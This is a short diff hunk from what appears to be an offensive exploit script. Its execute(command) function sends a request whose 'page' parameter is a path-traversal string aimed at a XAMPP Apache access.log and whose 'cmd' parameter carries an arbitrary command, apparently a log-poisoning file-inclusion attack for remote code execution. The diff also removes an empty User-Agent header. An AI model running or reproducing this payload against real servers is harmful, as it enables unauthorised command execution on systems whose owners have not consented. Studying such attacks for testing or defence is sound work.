@@ -60,9 +60,6 @@ def execute(command: str, timeout: float = None) -> str:
             "page": r"\..\..\..\..\..\..\..\..\..\..\\xampp\apache\logs\access.log",
             "cmd": command,
         },
-        headers={
-            "User-Agent": ""
-        },
         # ||BURP||
         timeout=timeout,
         verify=False,
